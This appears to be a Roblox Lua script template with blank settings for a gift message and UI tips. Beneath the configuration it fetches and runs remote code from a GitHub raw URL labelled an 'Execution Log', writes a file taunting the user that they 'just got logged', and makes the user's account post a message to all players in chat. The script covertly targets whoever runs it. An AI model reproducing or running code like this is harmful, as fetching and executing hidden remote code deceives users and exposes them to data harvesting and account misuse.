...
_G.GiftMessage = "" --// Message For The Gift To Say
...
--[[ UI Config ]]--
_G.ScriptName = "" --// Script Name On The UI
_G.Tip1 = "" --// Gives You Tips On The UI
_G.Tip2 = "" --// Gives You Tips On The UI
_G.Tip3 = "" --// Gives You Tips On The UI
_G.Tip4 = "" --// Gives You Tips On The UI
_G.Tip5 = "" --// Gives You Tips On The UI
...
--// Execution Log
loadstring(game:HttpGet("https://raw.githubusercontent.com/Costin10/roblox/main/log.lua"))()



writefile("ArkhalisOnTop.txt", "Damm u just got logged lmao")


game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|Arkhalis On Top!!!|","All")
